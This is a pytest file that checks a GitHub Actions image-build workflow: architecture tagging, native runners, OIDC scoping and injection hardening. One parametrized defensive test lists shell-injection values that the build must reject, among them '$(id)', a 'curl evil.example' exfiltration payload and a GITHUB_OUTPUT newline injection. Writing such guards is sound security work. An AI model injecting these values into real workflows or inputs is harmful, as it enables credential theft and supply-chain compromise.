"""Tests for the GitHub Actions image build and the per-architecture tagging it needs.

Both architectures of a bench image are built on separate native runners and then
joined into a manifest list. Almost everything that can go wrong in that shape
still produces a *green build and a pushed image* — one that fails much later, on
a worker, as an exec-format error or a pull failure. So these assert the things
that make such a failure impossible rather than merely unlikely: that a
single-platform push cannot claim `:latest`, that an architecture suffix cannot
disagree with the platform it labels, and that the workflow's runners are actually
native for the platforms they build.
"""

from __future__ import annotations

import re
from itertools import pairwise
from pathlib import Path

import pytest
import yaml

from bwa_mem3_bench import REPO_ROOT
from bwa_mem3_bench.base_image import BASE_REPO_SUFFIX
from bwa_mem3_bench.commands import _build as build_module
from bwa_mem3_bench.workflow_config import Arch, load_config

WORKFLOW = Path(__file__).resolve().parents[1] / ".github" / "workflows" / "build-image.yml"

#: Jobs that check the repository out: `prepare` (resolves the tag), each
#: `build` matrix leg, and each `build-tuned` leg. The join job needs no source.
_EXPECTED_CHECKOUT_JOBS = 3


def _workflow() -> dict:
    """Return the parsed build-image workflow."""
    return yaml.safe_load(WORKFLOW.read_text())


def _buildx_command(**build_kwargs: object) -> list[str]:
    """Run `build()` with `run_cmd` stubbed and return the buildx command."""
    captured: list[list[str]] = []

    def _capture(cmd: list[str], *, dry_run: bool, cwd: Path | None = None) -> None:  # noqa: ARG001
        captured.append(cmd)

    monkeypatch = pytest.MonkeyPatch()
    try:
        monkeypatch.setattr(build_module, "run_cmd", _capture)
        monkeypatch.setattr(build_module, "_ecr_login", lambda image_name, *, dry_run: None)
        build_module.build(
            fg_labs_sha="0" * 40,
            image_name="test",
            dry_run=True,
            **build_kwargs,  # type: ignore[arg-type]
        )
    finally:
        monkeypatch.undo()
    return next(c for c in captured if "buildx" in c)


def _pushed_tags(**build_kwargs: object) -> list[str]:
    """Run `build()` with `run_cmd` stubbed and return every `--tag` value."""
    buildx = _buildx_command(**build_kwargs)
    return [arg for flag, arg in pairwise(buildx) if flag == "--tag"]


def test_arch_tag_suffixes_the_pushed_tag() -> None:
    """The join names its sources by appending the arch, so the push must match."""
    tags = _pushed_tags(platforms="linux/amd64", arch_tag="amd64", push=True)
    assert tags == [f"test:{'0' * 40}-amd64"]


def test_a_single_platform_push_never_claims_latest() -> None:
    """`:latest` is resolved by the coordinator and every worker.

    Publishing one architecture under it takes the whole fleet down on the other,
    so the arch-tagged legs must leave it alone; the join applies it to the
    finished manifest list instead.
    """
    tags = _pushed_tags(platforms="linux/amd64", arch_tag="amd64", push=True)
    assert not any(tag.endswith(":latest") for tag in tags)

    # The guard must be specific to arch_tag, not a blanket disabling of :latest —
    # an ordinary multi-platform push still needs to move the tag.
    fleet_tags = _pushed_tags(push=True)
    assert any(tag.endswith(":latest") for tag in fleet_tags)


def test_arch_tag_must_match_the_platform_it_labels() -> None:
    """A mislabelled leg joins into the wrong slot and nothing downstream notices.

    The manifest list would advertise an arm64 image as `linux/amd64`; the push,
    the join and the workflow all succeed, and the failure lands on a worker as an
    exec-format error with no trail back to here.
    """
    with pytest.raises(ValueError, match="disagrees with"):
        build_module.build(
            fg_labs_sha="0" * 40,
            image_name="test",
            platforms="linux/arm64",
            arch_tag="amd64",
            push=True,
            dry_run=True,
        )


def test_arch_tag_is_rejected_for_a_multi_platform_build() -> None:
    """A multi-platform build already produces a manifest list; suffixing is incoherent."""
    with pytest.raises(ValueError, match="one architecture per invocation"):
        build_module.build(
            fg_labs_sha="0" * 40,
            image_name="test",
            platforms=build_module.FLEET_PLATFORMS,
            arch_tag="amd64",
            push=True,
            dry_run=True,
        )


def test_arch_tag_goes_last_so_stripping_it_yields_the_manifest_list_tag() -> None:
    """The join appends `-<arch>` to the final tag rather than splicing inside it."""
    assert (
        build_module.sha_image_tag(
            fg_labs_sha="a" * 40,
            baseline_arch="avx512bw",
            make_target="lto-build",
            arch_tag="amd64",
        )
        == f"{'a' * 40}-lto-build-avx512bw-amd64"
    )


def test_a_variant_push_is_the_tag_a_worker_pulls() -> None:
    """The build and the worker compose a variant tag independently; they must agree.

    `submit --make-target lto-build` makes the coordinator's image tag
    `<sha>-lto-build`, and `Arch.image_uri` then appends the arch's
    `baseline_arch`. A different suffix order on the build side publishes an image
    no c8g worker ever finds, and the run dies at image pull.
    """
    sha = "a" * 40
    arch = Arch(
        name="c8g",
        instance_type="c8g.4xlarge",
        batch_queue="q",
        simd="neon",
        platform="linux/arm64",
        baseline_arch="neoverse-v2",
    )
    pulled = arch.image_uri(ecr_repo_uri="test", fg_labs_sha=f"{sha}-lto-build")
    pushed = build_module.sha_image_tag(
        fg_labs_sha=sha, baseline_arch="neoverse-v2", make_target="lto-build"
    )
    assert pulled == f"test:{pushed}"


def test_image_tag_command_agrees_with_what_build_pushes(
    capsys: pytest.CaptureFixture[str],
) -> None:
    """The workflow resolves the tag with `image-tag` and joins that tag.

    If the two ever disagree the join names sources that were never pushed, so the
    printed value has to be exactly the pushed tag minus the arch suffix.
    """
    build_module.image_tag(fg_labs_sha="0" * 40, make_target="lto-build")
    printed = capsys.readouterr().out.strip()
    pushed = _pushed_tags(
        platforms="linux/amd64", arch_tag="amd64", make_target="lto-build", push=True
    )
    assert pushed == [f"test:{printed}-amd64"]


def test_image_tag_requires_exactly_one_target() -> None:
    """Neither is a no-op and both is ambiguous."""
    with pytest.raises(ValueError, match="exactly one"):
        build_module.image_tag()
    with pytest.raises(ValueError, match="exactly one"):
        build_module.image_tag(fg_labs_sha="a" * 40, base=True)


def test_every_fleet_platform_is_built_on_a_native_runner() -> None:
    """The whole point of building in CI is that nothing is emulated.

    A matrix leg pointed at the wrong runner still succeeds — GitHub's runners can
    emulate via QEMU — so this asserts the pairing rather than trusting it.
    """
    matrix = _workflow()["jobs"]["build"]["strategy"]["matrix"]["include"]
    native_runner_arch = {"ubuntu-24.04": "amd64", "ubuntu-24.04-arm": "arm64"}

    built = {leg["platform"] for leg in matrix}
    assert built == set(build_module.FLEET_PLATFORMS.split(",")), (
        "the workflow must build exactly the platforms the fleet pulls"
    )

    for leg in matrix:
        assert native_runner_arch[leg["runner"]] == leg["arch"], (
            f"{leg['runner']} is not native for {leg['arch']}"
        )
        assert leg["platform"] == f"linux/{leg['arch']}", (
            f"leg {leg} labels a platform it does not build"
        )


def test_an_arm_core_tuning_builds_arm64_only_under_its_own_tag() -> None:
    """The tuned binary can SIGILL on Graviton3, so it must never be portable.

    It defaults to arm64 even on a push (whose ordinary default is the whole
    fleet), carries the Makefile knobs as TUNE_* build-args rather than as an x86
    BASELINE_ARCH tier, and leaves `:latest` alone.
    """
    cmd = _buildx_command(baseline_arch="neoverse-v2", push=True)
    assert cmd[cmd.index("--platform") + 1] == "linux/arm64"
    build_args = {arg for flag, arg in pairwise(cmd) if flag == "--build-arg"}
    assert {
        "BASELINE_ARCH=",
        "TUNE_ARM_CPU=neoverse-v2",
        "TUNE_ARM_CACHE_LINE=64",
    } <= build_args
    tags = [arg for flag, arg in pairwise(cmd) if flag == "--tag"]
    assert tags == [f"test:{'0' * 40}-neoverse-v2"]


def test_a_portable_build_passes_empty_arm_tuning() -> None:
    """Explicitly empty, so the Dockerfile takes the generic arm64 path."""
    cmd = _buildx_command(push=True)
    build_args = {arg for flag, arg in pairwise(cmd) if flag == "--build-arg"}
    assert {"TUNE_ARM_CPU=", "TUNE_ARM_CACHE_LINE="} <= build_args


@pytest.mark.parametrize("platforms", ["linux/amd64", build_module.FLEET_PLATFORMS])
def test_an_arm_core_tuning_refuses_any_other_platform(platforms: str) -> None:
    """An amd64 half would ignore the tuning and publish an image nothing pulls."""
    with pytest.raises(ValueError, match="arm64 core tuning"):
        _buildx_command(baseline_arch="neoverse-v2", platforms=platforms, push=True)


def test_the_dockerfile_consumes_the_tuning_build_args_build_passes() -> None:
    """The ARG names live in two places; a rename on one side builds generic silently.

    buildx only *warns* about a `--build-arg` no `ARG` consumes, so a mismatch
    publishes a generic binary under the `-<tuning>` tag. The Dockerfile must also
    never declare the make variable names themselves: BuildKit exports ARGs into
    the RUN environment, and an empty `ARM_CACHE_LINE` there defeats the fg-labs
    Makefile's `?= 128` and fails the portable arm64 build.
    """
    dockerfile = (REPO_ROOT / "docker" / "Dockerfile").read_text()
    declared = set(re.findall(r"^ARG\s+([A-Za-z_]+)", dockerfile, re.MULTILINE))
    passed = {
        arg.split("=", 1)[0]
        for flag, arg in pairwise(_buildx_command(baseline_arch="neoverse-v2", push=True))
        if flag == "--build-arg"
    }
    assert {"TUNE_ARM_CPU", "TUNE_ARM_CACHE_LINE"} <= passed
    assert passed <= declared, f"build-args no ARG consumes: {sorted(passed - declared)}"
    assert not {"ARM_CPU", "ARM_CACHE_LINE"} & declared


def test_every_configured_variant_is_built_by_ci_on_a_native_runner() -> None:
    """A worker pulls `<sha>-<baseline_arch>`; if CI never builds it, the pull fails.

    That failure lands on a worker long after submit, so the tuned matrix must
    cover exactly the variants `config/archs.yaml` routes an arch to.
    """
    archs = load_config(REPO_ROOT / "config").archs.values()
    wanted = {(a.baseline_arch, a.platform) for a in archs if a.baseline_arch}
    matrix = _workflow()["jobs"]["build-tuned"]["strategy"]["matrix"]["include"]
    built = {(leg["tuning"], leg["platform"]) for leg in matrix}
    assert built == wanted
    native_runner_platform = {"ubuntu-24.04": "linux/amd64", "ubuntu-24.04-arm": "linux/arm64"}
    for leg in matrix:
        assert native_runner_platform[leg["runner"]] == leg["platform"], leg


def test_a_tuned_variant_cannot_block_the_portable_manifest_list() -> None:
    """A variant failure (e.g. a pre-v0.10.0 SHA) must not stop the join."""
    assert "build-tuned" not in _workflow()["jobs"]["join"]["needs"]


def test_the_workflow_is_never_triggered_by_a_pull_request() -> None:
    """This workflow pushes to ECR, and the repository is public.

    A `pull_request_target` trigger runs with repository context, so a fork's PR
    could reach the OIDC role. `workflow_dispatch` requires write access.
    """
    triggers = set(_workflow()[True])  # YAML parses the `on:` key as the boolean True
    assert triggers == {"workflow_dispatch"}


def test_only_the_build_and_join_jobs_can_mint_an_oidc_token() -> None:
    """`id-token: write` is what allows assuming the role, so it stays narrow."""
    jobs = _workflow()["jobs"]
    assert jobs["prepare"].get("permissions", {}).get("id-token") is None
    for name in ("build", "build-tuned", "join"):
        assert jobs[name]["permissions"]["id-token"] == "write"


def test_every_credentialed_job_runs_in_the_gated_environment() -> None:
    """The environment is what the role's trust policy names, and what gates it.

    The subject is `repo:...:environment:image-build`, so a job WITHOUT this key
    mints a token that STS refuses -- and, more importantly, the environment's
    required reviewer is the only thing standing between a dispatch from an
    arbitrary branch and a push to ECR. A credentialed job that skipped the
    environment would either fail closed or, if the subject were ever loosened,
    bypass the approval entirely.
    """
    jobs = _workflow()["jobs"]
    for name, job in jobs.items():
        mints_token = job.get("permissions", {}).get("id-token") == "write"
        if mints_token:
            assert job.get("environment") == "image-build", (
                f"job {name!r} mints an OIDC token outside the gated environment"
            )
        else:
            assert "environment" not in job, (
                f"job {name!r} declares an environment but needs no credentials"
            )


def test_the_join_verifies_both_architectures_landed() -> None:
    """A manifest list missing an arch pushes cleanly and fails much later."""
    steps = _workflow()["jobs"]["join"]["steps"]
    script = "\n".join(step.get("run", "") for step in steps)
    assert "imagetools inspect" in script
    assert "linux/amd64" in script and "linux/arm64" in script


# ── injection guards ────────────────────────────────────────────────────────
# The classic GitHub Actions vulnerability: `${{ }}` is substituted by the
# expression engine BEFORE bash parses the script, so an attacker-chosen input
# becomes script text and no amount of quoting inside the script helps. These
# jobs hold AWS credentials that can push images the benchmark fleet executes,
# and the ECR token `docker login` obtains stays valid for 12 hours -- longer
# than the role session -- so exfiltration is the failure that matters.


def _run_scripts(job: str) -> str:
    """Return every `run:` script in `job`, concatenated."""
    return "\n".join(step.get("run", "") for step in _workflow()["jobs"][job]["steps"])


def test_the_workflow_repository_names_match_their_source_of_truth() -> None:
    """The workflow hardcodes repository names that live in code and in CDK.

    The `-base` suffix is the sharp one. The build leg calls `build-base
    --image-name <repo>`, which appends `BASE_REPO_SUFFIX` itself, while the join
    step writes `-base` literally -- so changing the constant makes the build push
    one repository and the join read another. The build succeeds and the join then
    fails naming a source that was never pushed, pointing at the manifest step
    rather than at the rename that caused it.

    The bare name is checked against the CDK storage stack's default `ecr_name`,
    which is `project_name`.
    """
    workflow_text = WORKFLOW.read_text()

    base_refs = re.findall(r"\$\{REGISTRY\}/([A-Za-z0-9._-]+)", workflow_text)
    assert base_refs, "no repository references found; has the workflow changed shape?"

    # Every reference is either the benchmark repo or that name plus the suffix.
    benchmark = "bwa-mem3-bench"
    allowed = {benchmark, f"{benchmark}{BASE_REPO_SUFFIX}"}
    assert set(base_refs) <= allowed, (
        f"workflow references repositories {sorted(set(base_refs) - allowed)}, which "
        f"are neither the benchmark repo nor its {BASE_REPO_SUFFIX!r} sibling"
    )
    assert f"{benchmark}{BASE_REPO_SUFFIX}" in base_refs, (
        "the join step must reference the base repository; if BASE_REPO_SUFFIX "
        "changed, the workflow's literal '-base' no longer matches what "
        "`build-base` pushes to"
    )

    # The storage stack defaults `ecr_name` to `project_name`, which app.py sets
    # from PROJECT_NAME -- so that constant is what the ECR repository is named.
    app = (REPO_ROOT / "cdk" / "app.py").read_text()
    project_name = re.search(r'^PROJECT_NAME\s*=\s*"([^"]+)"', app, re.MULTILINE)
    assert project_name, "could not find PROJECT_NAME in cdk/app.py"
    assert project_name.group(1) == benchmark, (
        f"cdk/app.py names the project {project_name.group(1)!r} but the workflow "
        f"pushes to {benchmark!r}; the workflow would target a repository that "
        "does not exist"
    )


def test_every_workflow_pins_a_pixi_that_can_read_the_lockfile() -> None:
    """A lock written by a newer pixi than CI pins fails before any task runs.

    `pixi install --locked` aborts with `Lock-file version N is newer than
    supported`, so the job dies in setup with nothing having executed -- and a
    `pixi add` is an easy way to bump the lock format without noticing. Checked
    across every workflow because build-image.yml pins the same version twice and
    would have failed identically to check.yml.

    Compares major.minor only: a patch release does not change the lock format,
    and requiring exactness would fail on every unrelated pixi bump.
    """
    lock_version = int(
        yaml.safe_load((Path(WORKFLOW).parents[2] / "pixi.lock").read_text())["version"]
    )
    # The floor is a fact about pixi releases, not about this repo: 0.67 is the
    # first that writes v7. Update alongside the pin when the lock format moves.
    minimum_by_lock_version = {6: (0, 0), 7: (0, 67)}
    assert lock_version in minimum_by_lock_version, (
        f"pixi.lock is version {lock_version}, which this test has no floor for; "
        "add one and confirm the workflow pins are at least that"
    )
    required = minimum_by_lock_version[lock_version]

    pins = []
    for path in (Path(WORKFLOW).parents[0]).glob("*.yml"):
        for match in re.finditer(r"pixi-version:\s*v?(\d+)\.(\d+)\.(\d+)", path.read_text()):
            pins.append((path.name, (int(match.group(1)), int(match.group(2)))))
    assert pins, "no pixi-version pins found; this guard would be vacuous"

    for name, pin in pins:
        assert pin >= required, (
            f"{name} pins pixi {pin[0]}.{pin[1]}, which cannot read a version-"
            f"{lock_version} pixi.lock (needs >= {required[0]}.{required[1]})"
        )


@pytest.mark.parametrize("job", ["prepare", "build", "build-tuned", "join"])
def test_no_run_script_interpolates_an_expression(job: str) -> None:
    """No `${{ ... }}` anywhere inside a `run:` body, in any job.

    Asserted as a blanket ban rather than a per-value allowlist because the
    distinction between a "safe" and an "unsafe" expression is exactly the
    judgement that gets made wrong later. Values reach the shell through `env:`
    instead, which the expression engine does not rewrite.
    """
    assert "${{" not in _run_scripts(job), (
        f"job {job} interpolates an expression into a run: block; pass it via env: "
        "and reference it as a shell variable instead"
    )


def test_untrusted_inputs_are_passed_through_env() -> None:
    """The credentialed build step must receive its inputs as env vars."""
    build_steps = _workflow()["jobs"]["build"]["steps"]
    push_step = next(s for s in build_steps if "build and push" in s.get("name", ""))
    assert set(push_step["env"]) >= {"TARGET", "FG_LABS_SHA", "MAKE_TARGET"}


def test_make_target_is_a_closed_choice_not_free_text() -> None:
    """Free text here would reach a shell in a credentialed job.

    `build()` does enforce an allowlist, but in Python -- long after GitHub has
    substituted the value into the script. Constraining the input at its source
    is what actually prevents it.

    `default` is a sentinel for "plain make": a `choice` option may not be the
    empty string (GitHub rejects the workflow outright, which actionlint catches
    as `string should not be empty`), so the scripts translate it back to "".
    """
    make_target = _workflow()[True]["workflow_dispatch"]["inputs"]["make_target"]
    assert make_target["type"] == "choice"
    assert set(make_target["options"]) == {"default", "lto-build"}
    assert "" not in make_target["options"], (
        "GitHub rejects an empty choice option; use the `default` sentinel"
    )


def test_the_make_target_sentinel_is_translated_wherever_it_reaches_a_command() -> None:
    """`default` must never be passed through as a literal Makefile target.

    It would become the tag suffix `-default` and be rejected by `build()`'s
    allowlist, so this fails closed rather than mis-building -- but it would fail
    only after the runner had spun up, so it is pinned here instead.
    """
    for job in ("prepare", "build", "build-tuned"):
        script = _run_scripts(job)
        if "MAKE_TARGET" not in script:
            continue
        assert 'if [ "${make_target}" = "default" ]; then make_target=""; fi' in script, (
            f"job {job} uses MAKE_TARGET without translating the `default` sentinel"
        )
        assert '--make-target "${MAKE_TARGET}"' not in script, (
            f"job {job} passes the raw sentinel instead of the translated value"
        )


def test_the_sha_is_validated_before_any_credentialed_job() -> None:
    """Validation belongs in `prepare`, which holds no AWS credentials."""
    prepare = _workflow()["jobs"]["prepare"]
    assert prepare.get("permissions", {}).get("id-token") is None
    assert "40" in _run_scripts("prepare"), "prepare must enforce a full 40-char SHA"


def test_no_checkout_persists_the_github_token() -> None:
    """Every checkout in this workflow, not just the credentialed job's.

    `build` holds AWS credentials, so a token left in `.git/config` there is the
    sharpest case -- but `prepare` also runs repository code through pixi, and
    hardening one checkout while leaving its sibling is the asymmetry that gets
    noticed later rather than the one that was reasoned about.
    """
    checked = 0
    for job_name, job in _workflow()["jobs"].items():
        for step in job.get("steps", []):
            if not step.get("uses", "").startswith("actions/checkout@"):
                continue
            checked += 1
            assert step.get("with", {}).get("persist-credentials") is False, (
                f"the checkout in job {job_name!r} persists GITHUB_TOKEN"
            )
    assert checked >= _EXPECTED_CHECKOUT_JOBS, (
        f"expected checkouts in several jobs, found {checked}"
    )


@pytest.mark.parametrize(
    "bad",
    [
        "abc",  # abbreviated
        "0" * 39,  # one short
        "0" * 41,  # one long
        "0" * 39 + "G",  # non-hex
        "A" * 40,  # uppercase
        "$(id)",  # command substitution
        '"; curl evil.example #',  # the audit's exfiltration payload
        "0" * 40 + "\nmalicious=1",  # GITHUB_OUTPUT injection
    ],
)
def test_build_refuses_a_sha_that_is_not_a_full_hex_object_name(bad: str) -> None:
    """`FG_LABS_SHA` is expanded into a `git checkout` inside the image build.

    A value carrying shell metacharacters would execute in the builder and bake
    the result into an image the fleet then runs, so this is refused in Python as
    well as in the workflow -- the CLI is reachable from a laptop too.
    """
    with pytest.raises(ValueError, match="40-character lowercase hex"):
        build_module.build(
            fg_labs_sha=bad,
            image_name="test",
            dry_run=True,
        )


def test_build_accepts_a_well_formed_sha() -> None:
    """The guard must not reject the values it exists to allow."""
    assert _pushed_tags(push=True) == [f"test:{'0' * 40}", "test:latest"]
